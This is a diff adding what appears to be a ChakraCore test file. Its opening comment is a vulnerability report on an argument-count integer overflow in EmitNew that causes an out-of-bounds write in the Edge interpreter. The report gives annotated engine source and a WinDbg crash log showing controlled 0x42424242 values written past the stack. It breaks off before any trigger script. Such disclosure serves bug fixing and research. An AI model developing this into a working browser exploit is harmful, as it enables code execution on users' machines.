@@ -1,0 +1,867 @@
+<!--
+Report by Huang Anwen, He Xiaoxiao of ichunqiu Ker Team
+
+There is an overflow when constructoring a new object with arguments which has 0xffff elements in Chakra!
+This issue can be reproduced steadly in uptodate Edge in Win10 WIP.
+
+//ChakraCore-master\lib\Runtime\ByteCode\ByteCodeEmitter.cpp
+void EmitNew(ParseNode* pnode, ByteCodeGenerator* byteCodeGenerator, FuncInfo* funcInfo)
+{
+    Js::ArgSlot argCount = pnode->sxCall.argCount;			//pnode->sxCall.argCount=0xFFFF
+    argCount++; // include "this"							//overflow!!!! argCount==0
+
+    BOOL fSideEffectArgs = FALSE;
+    unsigned int tmpCount = CountArguments(pnode->sxCall.pnodeArgs, &fSideEffectArgs);
+    Assert(argCount == tmpCount);
+
+    if (argCount != (Js::ArgSlot)argCount)
+    {
+        Js::Throw::OutOfMemory();
+    }
+
+    byteCodeGenerator->StartStatement(pnode);
+
+    // Start call, allocate out param space
+    funcInfo->StartRecordingOutArgs(argCount);
+
+    // Assign the call target operand(s), putting them into expression temps if necessary to protect
+    // them from side-effects.
+    if (fSideEffectArgs)
+    {
+        SaveOpndValue(pnode->sxCall.pnodeTarget, funcInfo);
+    }
+
+    if (pnode->sxCall.pnodeTarget->nop == knopSuper)
+    {
+        EmitSuperFieldPatch(funcInfo, pnode, byteCodeGenerator);
+    }
+
+    Emit(pnode->sxCall.pnodeTarget, byteCodeGenerator, funcInfo, false, true);
+
+    if (pnode->sxCall.pnodeArgs == nullptr)
+    {
+        funcInfo->ReleaseLoc(pnode->sxCall.pnodeTarget);
+        Js::OpCode op = (CreateNativeArrays(byteCodeGenerator, funcInfo)
+            && CallTargetIsArray(pnode->sxCall.pnodeTarget))
+            ? Js::OpCode::NewScObjArray : Js::OpCode::NewScObject;
+        Assert(argCount == 1);
+
+        Js::ProfileId callSiteId = byteCodeGenerator->GetNextCallSiteId(op);
+        byteCodeGenerator->Writer()->StartCall(Js::OpCode::StartCall, argCount);
+        byteCodeGenerator->Writer()->CallI(op, funcInfo->AcquireLoc(pnode),
+            pnode->sxCall.pnodeTarget->location, argCount, callSiteId);
+    }
+    else
+    {
+        byteCodeGenerator->Writer()->StartCall(Js::OpCode::StartCall, argCount);
+        uint32 actualArgCount = 0;
+
+        if (IsCallOfConstants(pnode))
+        {
+            funcInfo->ReleaseLoc(pnode->sxCall.pnodeTarget);
+            actualArgCount = EmitNewObjectOfConstants(pnode, byteCodeGenerator, funcInfo, argCount);
+        }
+        else
+        {
+            Js::OpCode op;
+            if ((CreateNativeArrays(byteCodeGenerator, funcInfo) && CallTargetIsArray(pnode->sxCall.pnodeTarget)))
+            {
+                op = pnode->sxCall.spreadArgCount > 0 ? Js::OpCode::NewScObjArraySpread : Js::OpCode::NewScObjArray;
+            }
+            else
+            {
+                op = pnode->sxCall.spreadArgCount > 0 ? Js::OpCode::NewScObjectSpread : Js::OpCode::NewScObject;
+            }
+
+            Js::ProfileId callSiteId = byteCodeGenerator->GetNextCallSiteId(op);
+
+
+            Js::AuxArray<uint32> *spreadIndices = nullptr;
+            actualArgCount = EmitArgList(pnode->sxCall.pnodeArgs, Js::Constants::NoRegister, Js::Constants::NoRegister, Js::Constants::NoRegister,
+                false, true, byteCodeGenerator, funcInfo, callSiteId, pnode->sxCall.spreadArgCount, &spreadIndices);
+            funcInfo->ReleaseLoc(pnode->sxCall.pnodeTarget);
+
+
+            if (pnode->sxCall.spreadArgCount > 0)
+            {
+                Assert(spreadIndices != nullptr);
+                uint spreadExtraAlloc = spreadIndices->count * sizeof(uint32);
+                uint spreadIndicesSize = sizeof(*spreadIndices) + spreadExtraAlloc;
+                byteCodeGenerator->Writer()->CallIExtended(op, funcInfo->AcquireLoc(pnode), pnode->sxCall.pnodeTarget->location,
+                    (uint16)actualArgCount, Js::CallIExtended_SpreadArgs,
+                    spreadIndices, spreadIndicesSize, callSiteId);
+            }
+            else
+            {
+                byteCodeGenerator->Writer()->CallI(op, funcInfo->AcquireLoc(pnode), pnode->sxCall.pnodeTarget->location,
+                    (uint16)actualArgCount, callSiteId);
+            }
+        }
+
+        Assert(argCount == actualArgCount);
+    }
+
+    // End call, pop param space
+    funcInfo->EndRecordingOutArgs(argCount);
+    return;
+}
+
+//ChakraCore-master\lib\Runtime\Language\InterpreterStackFrame.cpp
+inline void InterpreterStackFrame::SetOut(ArgSlot_OneByte outRegisterID, Var aValue)
+{
+	Assert(m_outParams + outRegisterID < m_outSp);		
+	m_outParams[outRegisterID] = aValue;				//OOB Write!!!! outRegisterID could be 0~0xFFFF, but m_outParams has one element only 
+}
+
+//ChakraCore-master\lib\Runtime\Language\InterpreterStackFrame.cpp
+    Var InterpreterStackFrame::InterpreterHelper(ScriptFunction* function, ArgumentReader args, void* returnAddress, void* addressOfReturnAddress, const bool isAsmJs)
+    {
+
+#ifdef ENABLE_DEBUG_CONFIG_OPTIONS
+        // Support for simulating partially initialized interpreter stack frame.
+        InterpreterThunkStackCountTracker tracker;
+
+        if (CONFIG_ISENABLED(InjectPartiallyInitializedInterpreterFrameErrorFlag) &&
+            CONFIG_FLAG(InjectPartiallyInitializedInterpreterFrameError) == InterpreterThunkStackCountTracker::GetCount())
+        {
+            switch (CONFIG_FLAG(InjectPartiallyInitializedInterpreterFrameErrorType))
+            {
+            case 0:
+                DebugBreak();
+                break;
+            case 1:
+                Js::JavascriptError::MapAndThrowError(function->GetScriptContext(), VBSERR_InternalError);
+                break;
+            default:
+                DebugBreak();
+            }
+        }
+#endif
+        ScriptContext* functionScriptContext = function->GetScriptContext();
+        ThreadContext * threadContext = functionScriptContext->GetThreadContext();
+        Assert(!threadContext->IsDisableImplicitException());
+        functionScriptContext->VerifyAlive(!function->IsExternal());
+        Assert(threadContext->IsScriptActive());
+        Assert(threadContext->IsInScript());
+
+        FunctionBody* executeFunction = JavascriptFunction::FromVar(function)->GetFunctionBody();
+#ifdef ENABLE_DEBUG_CONFIG_OPTIONS
+        if (!isAsmJs && executeFunction->IsInDebugMode() != functionScriptContext->IsScriptContextInDebugMode()) // debug mode mismatch
+        {
+            if (executeFunction->GetUtf8SourceInfo()->GetIsLibraryCode())
+            {
+                Assert(!executeFunction->IsInDebugMode()); // Library script byteCode is never in debug mode
+            }
+            else
+            {
+                Throw::FatalInternalError();
+            }
+        }
+#endif
+
+        if (executeFunction->GetInterpretedCount() == 0)
+        {
+            executeFunction->TraceInterpreterExecutionMode();
+        }
+
+
+        class AutoRestore
+        {
+        private:
+            ThreadContext *const threadContext;
+            const uint8 savedLoopDepth;
+
+        public:
+            AutoRestore(ThreadContext *const threadContext, FunctionBody *const executeFunction)
+                : threadContext(threadContext),
+                savedLoopDepth(threadContext->LoopDepth())
+            {
+                if (savedLoopDepth != 0 && !executeFunction->GetIsAsmJsFunction())
+                {
+                    executeFunction->SetWasCalledFromLoop();
+                }
+            }
+
+            ~AutoRestore()
+            {
+                threadContext->SetLoopDepth(savedLoopDepth);
+            }
+        } autoRestore(threadContext, executeFunction);
+
+#if ENABLE_PROFILE_INFO
+        DynamicProfileInfo * dynamicProfileInfo = nullptr;
+        const bool doProfile = executeFunction->GetInterpreterExecutionMode(false) == ExecutionMode::ProfilingInterpreter ||
+                               (executeFunction->IsInDebugMode() && DynamicProfileInfo::IsEnabled(executeFunction));
+        if (doProfile)
+        {
+#if !DYNAMIC_INTERPRETER_THUNK
+            executeFunction->EnsureDynamicProfileInfo();
+#endif
+            dynamicProfileInfo = executeFunction->GetDynamicProfileInfo();
+            threadContext->ClearImplicitCallFlags();
+        }
+#else
+        const bool doProfile = false;
+#endif
+
+        executeFunction->IncreaseInterpretedCount();
+#ifdef BGJIT_STATS
+        functionScriptContext->interpretedCount++;
+        functionScriptContext->maxFuncInterpret = max(functionScriptContext->maxFuncInterpret, executeFunction->GetInterpretedCount());
+#endif
+
+        AssertMsg(!executeFunction->IsDeferredParseFunction(),
+            "Non-intrinsic functions must provide byte-code to execute");
+
+        executeFunction->BeginExecution();
+
+        bool fReleaseAlloc = false;
+        InterpreterStackFrame* newInstance = nullptr;
+        Var* allocation = nullptr;
+
+        if (!isAsmJs && executeFunction->IsCoroutine())
+        {
+            // If the FunctionBody is a generator then this call is being made by one of the three
+            // generator resuming methods: next(), throw(), or return().  They all pass the generator
+            // object as the first of two arguments.  The real user arguments are obtained from the
+            // generator object.  The second argument is the ResumeYieldData which is only needed
+            // when resuming a generator and so it only used here if a frame already exists on the
+            // generator object.
+            AssertMsg(args.Info.Count == 2, "Generator ScriptFunctions should only be invoked by generator APIs with the pair of arguments they pass in -- the generator object and a ResumeYieldData pointer");
+            JavascriptGenerator* generator = JavascriptGenerator::FromVar(args[0]);
+            newInstance = generator->GetFrame();
+
+            if (newInstance != nullptr)
+            {
+                ResumeYieldData* resumeYieldData = static_cast<ResumeYieldData*>(args[1]);
+                newInstance->SetNonVarReg(executeFunction->GetYieldRegister(), resumeYieldData);
+
+                // The debugger relies on comparing stack addresses of frames to decide when a step_out is complete so
+                // give the InterpreterStackFrame a legit enough stack address to make this comparison work.
+                newInstance->m_stackAddress = reinterpret_cast<DWORD_PTR>(&generator);
+            }
+            else
+            {
+                //
+                // Allocate a new InterpreterStackFrame instance on the recycler heap.
+                // It will live with the JavascriptGenerator object.
+                //
+                Arguments generatorArgs = generator->GetArguments();
+                InterpreterStackFrame::Setup setup(function, generatorArgs);
+                size_t varAllocCount = setup.GetAllocationVarCount();
+                size_t varSizeInBytes = varAllocCount * sizeof(Var);
+                DWORD_PTR stackAddr = reinterpret_cast<DWORD_PTR>(&generator); // as mentioned above, use any stack address from this frame to ensure correct debugging functionality
+                Var loopHeaderArray = executeFunction->GetHasAllocatedLoopHeaders() ? executeFunction->GetLoopHeaderArrayPtr() : nullptr;
+
+                allocation = RecyclerNewPlus(functionScriptContext->GetRecycler(), varSizeInBytes, Var);
+                AnalysisAssert(allocation);
+#if DBG
+                // Allocate invalidVar on GC instead of stack since this InterpreterStackFrame will out live the current real frame
+                Js::RecyclableObject* invalidVar = (Js::RecyclableObject*)RecyclerNewPlusLeaf(functionScriptContext->GetRecycler(), sizeof(Js::RecyclableObject), Var);
+                AnalysisAssert(invalidVar);
+                memset(reinterpret_cast<void*>(invalidVar), 0xFE, sizeof(Js::RecyclableObject));
+                newInstance = setup.InitializeAllocation(allocation, executeFunction->GetHasImplicitArgIns(), doProfile, loopHeaderArray, stackAddr, invalidVar);
+#else
+                newInstance = setup.InitializeAllocation(allocation, executeFunction->GetHasImplicitArgIns(), doProfile, loopHeaderArray, stackAddr);
+#endif
+
+                newInstance->m_reader.Create(executeFunction);
+
+                generator->SetFrame(newInstance, varSizeInBytes);
+            }
+        }
+        else
+        {
+            InterpreterStackFrame::Setup setup(function, args);
+            size_t varAllocCount = setup.GetAllocationVarCount();
+            size_t varSizeInBytes = varAllocCount * sizeof(Var);
+
+            //
+            // Allocate a new InterpreterStackFrame instance on the interpreter's virtual stack.
+            //
+            DWORD_PTR stackAddr;
+
+            // If the locals area exceeds a certain limit, allocate it from a private arena rather than
+            // this frame. The current limit is based on an old assert on the number of locals we would allow here.
+            if (varAllocCount > InterpreterStackFrame::LocalsThreshold)
+            {
+                ArenaAllocator *tmpAlloc = nullptr;
+                fReleaseAlloc = functionScriptContext->EnsureInterpreterArena(&tmpAlloc);
+                allocation = (Var*)tmpAlloc->Alloc(varSizeInBytes);
+                stackAddr = reinterpret_cast<DWORD_PTR>(&allocation); // use a stack address so the debugger stepping logic works (step-out, for example, compares stack depths to determine when to complete the step)
+            }
+            else
+            {
+                PROBE_STACK_PARTIAL_INITIALIZED_INTERPRETER_FRAME(functionScriptContext, Js::Constants::MinStackInterpreter + varSizeInBytes);
+                allocation = (Var*)_alloca(varSizeInBytes);
+#if DBG
+                memset(allocation, 0xFE, varSizeInBytes);
+#endif
+                stackAddr = reinterpret_cast<DWORD_PTR>(allocation);
+            }
+
+            /*
+            * If the function has any loop headers, we allocate an array for the loop headers wrappers, and
+            * reference the wrappers in the array. We then push the pointer to the array onto the stack itself.
+            * We do this so that while the function is being interpreted, we don't want the jitted loop
+            * bodies to be collected, even if the loop body isn't being executed. The loop body will
+            * get collected when the function has been JITted, and when the function exits the interpreter.
+            * The array contains nulls if the loop body isn't jitted (or hasn't been jitted yet) but
+            * it's cheaper to just copy them all into the recycler array rather than just the ones that
+            * have been jitted.
+            */
+            Var loopHeaderArray = nullptr;
+
+            if (executeFunction->GetHasAllocatedLoopHeaders())
+            {
+                // Loop header array is recycler allocated, so we push it on the stack
+                // When we scan the stack, we'll recognize it as a recycler allocated
+                // object, and mark it's contents and keep the individual loop header
+                // wrappers alive
+                loopHeaderArray = executeFunction->GetLoopHeaderArrayPtr();
+            }
+
+#if DBG
+            Js::RecyclableObject * invalidStackVar = (Js::RecyclableObject*)_alloca(sizeof(Js::RecyclableObject));
+            memset(reinterpret_cast<void*>(invalidStackVar), 0xFE, sizeof(Js::RecyclableObject));
+            newInstance = setup.InitializeAllocation(allocation, executeFunction->GetHasImplicitArgIns() && !isAsmJs, doProfile, loopHeaderArray, stackAddr, invalidStackVar);
+#else
+            newInstance = setup.InitializeAllocation(allocation, executeFunction->GetHasImplicitArgIns() && !isAsmJs, doProfile, loopHeaderArray, stackAddr);
+#endif
+
+            newInstance->m_reader.Create(executeFunction);
+        }
+        //
+        // Execute the function's byte-code, returning the return-value:
+        // - Mark that the function is current executing and may not be modified.
+        //
+
+#if ENABLE_TTD
+        TTD::TTDExceptionFramePopper exceptionFramePopper;
+        if(SHOULD_DO_TTD_STACK_STMT_OP(functionScriptContext))
+        {
+            bool isInFinally = ((newInstance->m_flags & Js::InterpreterStackFrameFlags_WithinFinallyBlock) == Js::InterpreterStackFrameFlags_WithinFinallyBlock);
+
+            threadContext->TTDExecutionInfo->PushCallEvent(function, args.Info.Count, args.Values, isInFinally);
+            exceptionFramePopper.PushInfo(threadContext->TTDExecutionInfo, function);
+        }
+#endif
+
+        Var aReturn = nullptr;
+
+        {
+            if (!isAsmJs && executeFunction->IsInDebugMode())
+            {
+#if DYNAMIC_INTERPRETER_THUNK
+                PushPopFrameHelper pushPopFrameHelper(newInstance, returnAddress, addressOfReturnAddress);
+                aReturn = newInstance->DebugProcess();
+#else
+                aReturn = newInstance->DebugProcessThunk(_ReturnAddress(), _AddressOfReturnAddress());
+#endif
+            }
+            else
+            {
+#if DYNAMIC_INTERPRETER_THUNK
+                PushPopFrameHelper pushPopFrameHelper(newInstance, returnAddress, addressOfReturnAddress);
+                aReturn = newInstance->Process();
+#else
+                aReturn = newInstance->ProcessThunk(_ReturnAddress(), _AddressOfReturnAddress());
+#endif
+            }
+        }
+
+        executeFunction->EndExecution();
+
+#if ENABLE_TTD
+        if(SHOULD_DO_TTD_STACK_STMT_OP(functionScriptContext))
+        {
+            exceptionFramePopper.PopInfo();
+            threadContext->TTDExecutionInfo->PopCallEvent(function, aReturn);
+        }
+#endif
+
+        if (fReleaseAlloc)
+        {
+            functionScriptContext->ReleaseInterpreterArena();
+        }
+
+#if ENABLE_PROFILE_INFO
+        if (doProfile)
+        {
+            dynamicProfileInfo->RecordImplicitCallFlags(threadContext->GetImplicitCallFlags());
+        }
+#endif
+
+        if (isAsmJs)
+        {
+            return newInstance;
+        }
+        return aReturn;
+    }
+
+	
+Microsoft (R) Windows Debugger Version 6.12.0002.633 AMD64
+Copyright (c) Microsoft Corporation. All rights reserved.
+
+*** wait with pending attach
+Symbol search path is: SRV*c:\mysymbol* http://msdl.microsoft.com/download/symbols
+Executable search path is: 
+ModLoad: 00007ff6`1e3c0000 00007ff6`1e3e5000   C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdgeCP.exe
+ModLoad: 00007ffe`a1ea0000 00007ffe`a207b000   C:\Windows\SYSTEM32\ntdll.dll
+ModLoad: 00007ffe`a0a70000 00007ffe`a0b1e000   C:\Windows\System32\KERNEL32.DLL
+ModLoad: 00007ffe`9e590000 00007ffe`9e7d9000   C:\Windows\System32\KERNELBASE.dll
+ModLoad: 00007ffe`9c900000 00007ffe`9c97e000   C:\Windows\SYSTEM32\apphelp.dll
+ModLoad: 00007ffe`a0ee0000 00007ffe`a11d9000   C:\Windows\System32\combase.dll
+ModLoad: 00007ffe`9e7e0000 00007ffe`9e8d6000   C:\Windows\System32\ucrtbase.dll
+ModLoad: 00007ffe`a0d00000 00007ffe`a0e25000   C:\Windows\System32\RPCRT4.dll
+ModLoad: 00007ffe`9ebc0000 00007ffe`9ec2a000   C:\Windows\System32\bcryptPrimitives.dll
+ModLoad: 00007ffe`a0c50000 00007ffe`a0ced000   C:\Windows\System32\msvcrt.dll
+ModLoad: 00007ffe`98900000 00007ffe`98960000   C:\Windows\SYSTEM32\wincorlib.DLL
+ModLoad: 00007ffe`a1de0000 00007ffe`a1ea0000   C:\Windows\System32\OLEAUT32.dll
+ModLoad: 00007ffe`9ea70000 00007ffe`9eb0a000   C:\Windows\System32\msvcp_win.dll
+ModLoad: 00007ffe`9e330000 00007ffe`9e341000   C:\Windows\System32\kernel.appcore.dll
+ModLoad: 00007ffe`7d930000 00007ffe`7dcf4000   C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\EdgeContent.dll
+ModLoad: 00007ffe`9ece0000 00007ffe`9f3d2000   C:\Windows\System32\Windows.Storage.dll
+ModLoad: 00007ffe`a0b90000 00007ffe`a0c31000   C:\Windows\System32\advapi32.dll
+ModLoad: 00007ffe`9f400000 00007ffe`9f459000   C:\Windows\System32\sechost.dll
+ModLoad: 00007ffe`96080000 00007ffe`96306000   C:\Windows\SYSTEM32\iertutil.dll
+ModLoad: 00007ffe`a13b0000 00007ffe`a1401000   C:\Windows\System32\shlwapi.dll
+ModLoad: 00007ffe`a0e30000 00007ffe`a0eda000   C:\Windows\System32\shcore.dll
+ModLoad: 00007ffe`9f460000 00007ffe`9f487000   C:\Windows\System32\GDI32.dll
+ModLoad: 00007ffe`9e8e0000 00007ffe`9ea69000   C:\Windows\System32\gdi32full.dll
+ModLoad: 00007ffe`a1c90000 00007ffe`a1dda000   C:\Windows\System32\USER32.dll
+ModLoad: 00007ffe`9f3e0000 00007ffe`9f3fe000   C:\Windows\System32\win32u.dll
+ModLoad: 00007ffe`9e370000 00007ffe`9e3bc000   C:\Windows\System32\powrprof.dll
+ModLoad: 00007ffe`9e310000 00007ffe`9e325000   C:\Windows\System32\profapi.dll
+ModLoad: 00007ffe`9e210000 00007ffe`9e239000   C:\Windows\SYSTEM32\USERENV.dll
+ModLoad: 00007ffe`8d040000 00007ffe`8d066000   C:\Windows\SYSTEM32\clipc.dll
+ModLoad: 00007ffe`9d610000 00007ffe`9d641000   C:\Windows\SYSTEM32\ntmarta.dll
+ModLoad: 00007ffe`9dd60000 00007ffe`9dd77000   C:\Windows\SYSTEM32\cryptsp.dll
+ModLoad: 00007ffe`9d9a0000 00007ffe`9da44000   C:\Windows\SYSTEM32\DNSAPI.dll
+ModLoad: 00007ffe`a18b0000 00007ffe`a191c000   C:\Windows\System32\WS2_32.dll
+ModLoad: 00007ffe`a0b20000 00007ffe`a0b28000   C:\Windows\System32\NSI.dll
+ModLoad: 00007ffe`a0a40000 00007ffe`a0a6d000   C:\Windows\System32\IMM32.DLL
+ModLoad: 00007ffe`9d960000 00007ffe`9d997000   C:\Windows\SYSTEM32\IPHLPAPI.DLL
+ModLoad: 00007ffe`9ccc0000 00007ffe`9ce30000   C:\Windows\SYSTEM32\twinapi.appcore.dll
+ModLoad: 00007ffe`9e1e0000 00007ffe`9e205000   C:\Windows\SYSTEM32\bcrypt.dll
+ModLoad: 00007ffe`9d440000 00007ffe`9d461000   C:\Windows\SYSTEM32\profext.dll
+ModLoad: 00007ffe`8c940000 00007ffe`8c9b4000   C:\Windows\SYSTEM32\msiso.dll
+ModLoad: 00007ffe`983e0000 00007ffe`98402000   C:\Windows\SYSTEM32\EShims.dll
+ModLoad: 00007ffe`90b10000 00007ffe`90b2b000   C:\Windows\SYSTEM32\MPR.dll
+ModLoad: 00007ffe`a1920000 00007ffe`a1a65000   C:\Windows\System32\ole32.dll
+ModLoad: 00007ffe`9cab0000 00007ffe`9cb45000   C:\Windows\system32\uxtheme.dll
+ModLoad: 00007ffe`8b6f0000 00007ffe`8b791000   C:\Program Files\Common Files\microsoft shared\ink\tiptsf.dll
+ModLoad: 00007ffe`81fa0000 00007ffe`83651000   C:\Windows\SYSTEM32\edgehtml.dll
+ModLoad: 00007ffe`9a690000 00007ffe`9a7c9000   C:\Windows\SYSTEM32\wintypes.dll
+ModLoad: 00007ffe`915c0000 00007ffe`915ff000   C:\Windows\SYSTEM32\MLANG.dll
+ModLoad: 00007ffe`80f50000 00007ffe`8173a000   C:\Windows\SYSTEM32\chakra.dll
+ModLoad: 00007ffe`9afe0000 00007ffe`9b056000   C:\Windows\SYSTEM32\policymanager.dll
+ModLoad: 00007ffe`9af20000 00007ffe`9afaf000   C:\Windows\SYSTEM32\msvcp110_win.dll
+ModLoad: 00007ffe`9b2d0000 00007ffe`9b466000   C:\Windows\SYSTEM32\PROPSYS.dll
+ModLoad: 00007ffe`88e90000 00007ffe`88f5b000   C:\Windows\System32\ieproxy.dll
+ModLoad: 00007ffe`98590000 00007ffe`98696000   C:\Windows\System32\Windows.UI.dll
+ModLoad: 00007ffe`98500000 00007ffe`98582000   C:\Windows\SYSTEM32\TextInputFramework.dll
+ModLoad: 00007ffe`99ad0000 00007ffe`99da2000   C:\Windows\SYSTEM32\CoreUIComponents.dll
+ModLoad: 00007ffe`9c1d0000 00007ffe`9c2b3000   C:\Windows\SYSTEM32\CoreMessaging.dll
+ModLoad: 00007ffe`9ae40000 00007ffe`9ae55000   C:\Windows\SYSTEM32\usermgrcli.dll
+ModLoad: 00007ffe`98f20000 00007ffe`99451000   C:\Windows\System32\OneCoreUAPCommonProxyStub.dll
+ModLoad: 00007ffe`9b470000 00007ffe`9b49a000   C:\Windows\SYSTEM32\dwmapi.dll
+ModLoad: 00007ffe`9f490000 00007ffe`a08c7000   C:\Windows\System32\shell32.dll
+ModLoad: 00007ffe`9ec30000 00007ffe`9ec79000   C:\Windows\System32\cfgmgr32.dll
+ModLoad: 00007ffe`a08d0000 00007ffe`a0a36000   C:\Windows\System32\msctf.dll
+ModLoad: 00007ffe`98700000 00007ffe`98802000   C:\Windows\SYSTEM32\mrmcorer.dll
+ModLoad: 00007ffe`8d070000 00007ffe`8d39e000   C:\Windows\SYSTEM32\WININET.dll
+ModLoad: 00007ffe`9e240000 00007ffe`9e270000   C:\Windows\SYSTEM32\SspiCli.dll
+ModLoad: 00007ffe`98860000 00007ffe`988c9000   C:\Windows\SYSTEM32\Bcp47Langs.dll
+ModLoad: 00007ffe`8a7c0000 00007ffe`8a7d0000   C:\Windows\SYSTEM32\tokenbinding.dll
+ModLoad: 00007ffe`8d800000 00007ffe`8d81b000   C:\Windows\SYSTEM32\ondemandconnroutehelper.dll
+ModLoad: 00007ffe`963d0000 00007ffe`964a7000   C:\Windows\SYSTEM32\winhttp.dll
+ModLoad: 00007ffe`9dbc0000 00007ffe`9dc1c000   C:\Windows\system32\mswsock.dll
+ModLoad: 00007ffe`9a290000 00007ffe`9a29b000   C:\Windows\SYSTEM32\WINNSI.DLL
+ModLoad: 00007ffe`957f0000 00007ffe`959b8000   C:\Windows\SYSTEM32\urlmon.dll
+ModLoad: 00007ffe`9dd80000 00007ffe`9dd8b000   C:\Windows\SYSTEM32\CRYPTBASE.DLL
+ModLoad: 00007ffe`8ca20000 00007ffe`8ca3a000   C:\Windows\System32\Windows.Shell.ServiceHostBuilder.dll
+ModLoad: 00007ffe`7fed0000 00007ffe`8005a000   C:\Windows\SYSTEM32\ieapfltr.dll
+ModLoad: 00007ffe`999d0000 00007ffe`999ed000   C:\Windows\System32\rmclient.dll
+ModLoad: 00007ffe`89aa0000 00007ffe`89ab8000   C:\Windows\System32\UiaManager.dll
+ModLoad: 00007ffe`8a860000 00007ffe`8a8a7000   C:\Windows\system32\dataexchange.dll
+ModLoad: 00007ffe`9c2c0000 00007ffe`9c3e2000   C:\Windows\SYSTEM32\dcomp.dll
+ModLoad: 00007ffe`9b940000 00007ffe`9bc1f000   C:\Windows\SYSTEM32\d3d11.dll
+ModLoad: 00007ffe`9d180000 00007ffe`9d224000   C:\Windows\SYSTEM32\dxgi.dll
+ModLoad: 00007ffe`8bb90000 00007ffe`8bc12000   C:\Windows\system32\twinapi.dll
+ModLoad: 00007ffe`84db0000 00007ffe`84e2a000   C:\Windows\SYSTEM32\windows.ui.core.textinput.dll
+ModLoad: 00007ffe`81c30000 00007ffe`81c58000   C:\Windows\SYSTEM32\srpapi.dll
+ModLoad: 00007ffe`9e3c0000 00007ffe`9e589000   C:\Windows\System32\CRYPT32.dll
+ModLoad: 00007ffe`9e350000 00007ffe`9e361000   C:\Windows\System32\MSASN1.dll
+ModLoad: 00007ffe`846e0000 00007ffe`8473a000   C:\Windows\System32\Windows.Graphics.dll
+ModLoad: 00007ffe`8cf00000 00007ffe`8cf5d000   C:\Windows\SYSTEM32\ninput.dll
+ModLoad: 00007ffe`9bc20000 00007ffe`9c1c4000   C:\Windows\SYSTEM32\d2d1.dll
+ModLoad: 00007ffe`943a0000 00007ffe`94660000   C:\Windows\SYSTEM32\DWrite.dll
+ModLoad: 00007ffe`81910000 00007ffe`8191f000   C:\Windows\System32\Windows.Internal.SecurityMitigationsBroker.dll
+ModLoad: 00007ffe`99510000 00007ffe`99552000   C:\Windows\SYSTEM32\vm3dum64.dll
+ModLoad: 00007ffe`994a0000 00007ffe`99507000   C:\Windows\SYSTEM32\D3D10Level9.dll
+ModLoad: 00007ffe`8b4b0000 00007ffe`8b51b000   C:\Windows\System32\oleacc.dll
+ModLoad: 00007ffe`81bf0000 00007ffe`81c00000   C:\Windows\system32\msimtf.dll
+ModLoad: 00007ffe`940f0000 00007ffe`94178000   C:\Windows\system32\directmanipulation.dll
+ModLoad: 00007ffe`98170000 00007ffe`98184000   C:\Windows\System32\Windows.System.Profile.PlatformDiagnosticsAndUsageDataSettings.dll
+ModLoad: 00007ffe`81bb0000 00007ffe`81be8000   C:\Windows\System32\smartscreenps.dll
+ModLoad: 00007ffe`94210000 00007ffe`94398000   C:\Windows\SYSTEM32\windows.globalization.dll
+ModLoad: 00007ffe`8b520000 00007ffe`8b6e5000   C:\Windows\System32\uiautomationcore.dll
+(1590.5d8): Break instruction exception - code 80000003 (first chance)
+ntdll!DbgBreakPoint:
+00007ffe`a1f48d70 cc              int     3
+0:035> g
+onecoreuap\inetcore\urlmon\zones\zoneidentifier.cxx(359)\urlmon.dll!00007FFE958108C0: (caller: 00007FFE9580F77D) ReturnHr(2) tid(b70) 80070002 œµÕ≥’“≤ªµΩ÷∏∂®µƒŒƒº˛°£
+(1590.b70): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+chakra!Js::InterpreterStackFrame::ProcessUnprofiledLargeLayoutPrefix+0xd5d:
+00007ffe`8133ba8d 488904d1        mov     qword ptr [rcx+rdx*8],rax ds:000000d8`b8400000=????????????????
+0:016> r
+rax=0001000042424242 rbx=000002aa98205cbb rcx=000000d8b83f9e98
+rdx=0000000000000c2d rsi=0000000000000000 rdi=000002aa98200025
+rip=00007ffe8133ba8d rsp=000000d8b83f9bd0 rbp=000000d8b83f9c00
+ r8=000000d8b83f9d20  r9=000002aa8688fe00 r10=000002aa86879760
+r11=000000d8b83f9978 r12=0000000000000000 r13=000002aa8312a270
+r14=0000000000000000 r15=000002aa98205cc2
+iopl=0         nv up ei pl nz ac pe nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010212
+chakra!Js::InterpreterStackFrame::ProcessUnprofiledLargeLayoutPrefix+0xd5d:
+00007ffe`8133ba8d 488904d1        mov     qword ptr [rcx+rdx*8],rax ds:000000d8`b8400000=????????????????
+0:016> dq ecx
+000000d8`b83f9e98  00000000`00000030 000002aa`86879760
+000000d8`b83f9ea8  00010000`42424242 00010000`42424242
+000000d8`b83f9eb8  00010000`42424242 00010000`42424242
+000000d8`b83f9ec8  00010000`42424242 00010000`42424242
+000000d8`b83f9ed8  00010000`42424242 00010000`42424242
+000000d8`b83f9ee8  00010000`42424242 00010000`42424242
+000000d8`b83f9ef8  00010000`42424242 00010000`42424242
+000000d8`b83f9f08  00010000`42424242 00010000`42424242
+0:016> dq [ecx+edx*8]
+000000d8`b8400000  ????????`???????? ????????`????????
+000000d8`b8400010  ????????`???????? ????????`????????
+000000d8`b8400020  ????????`???????? ????????`????????
+000000d8`b8400030  ????????`???????? ????????`????????
+000000d8`b8400040  ????????`???????? ????????`????????
+000000d8`b8400050  ????????`???????? ????????`????????
+000000d8`b8400060  ????????`???????? ????????`????????
+000000d8`b8400070  ????????`???????? ????????`????????
+0:016> !address 000000d8`b8400000 
+
+                                     
+Usage:                  
+Allocation Base:        000000d8`b8400000
+Base Address:           000000d8`b8400000
+End Address:            000000d8`b84fc000
+Region Size:            00000000`000fc000
+Type:                   00020000	MEM_PRIVATE
+State:                  00002000	MEM_RESERVE
+Protect:                00000000	
+More info:              ~17k
+
+0:016> !address ecx
+Usage:                  Stack
+Allocation Base:        000000d8`b7a00000
+Base Address:           000000d8`b83f4000
+End Address:            000000d8`b8400000
+Region Size:            00000000`0000c000
+Type:                   00020000	MEM_PRIVATE
+State:                  00001000	MEM_COMMIT
+Protect:                00000004	PAGE_READWRITE
+More info:              ~16k
+
+0:016> kb
+RetAddr           : Args to Child                                                           : Call Site
